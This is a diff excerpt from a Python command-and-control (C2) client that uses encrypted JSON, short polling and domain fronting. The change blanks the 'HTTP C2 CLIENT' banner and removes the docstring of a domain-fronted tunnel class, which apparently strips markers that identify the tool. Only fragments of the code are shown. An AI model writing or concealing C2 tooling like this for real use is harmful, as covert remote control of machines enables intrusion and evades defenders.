@@ -20,12 +20,7 @@ from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 R="\033[0m"; BOLD="\033[1m"; DIM="\033[2m"
 G="\033[92m"; RED="\033[91m"; CY="\033[96m"; YL="\033[93m"; MG="\033[95m"
 
-BANNER = f"""
-{BOLD}{MG}╔══════════════════════════════════════════════╗
-║   HTTP C2 CLIENT                             ║
-║   Encrypted JSON · Short-Poll · Domain Front ║
-╚══════════════════════════════════════════════╝{R}
-"""
+BANNER = f""" """
 
 # ── Crypto ────────────────────────────────────────────────────────────────────
 def derive_key(psk: str) -> bytes:
@@ -54,10 +49,6 @@ def discover_jwt():
 
 # ── Fronted HTTP connection ───────────────────────────────────────────────────
 class FrontedSession:
-    """
-    Manages a single HTTPS request over a domain-fronted tunnel.
-    Each request opens a fresh CONNECT tunnel (keeps it stateless / proxy-friendly).
-    """
     def __init__(self, proxy_ip, proxy_port, proxy_user, proxy_token,
                  front_host, sni_host, timeout=15):
         self.proxy_ip    = proxy_ip
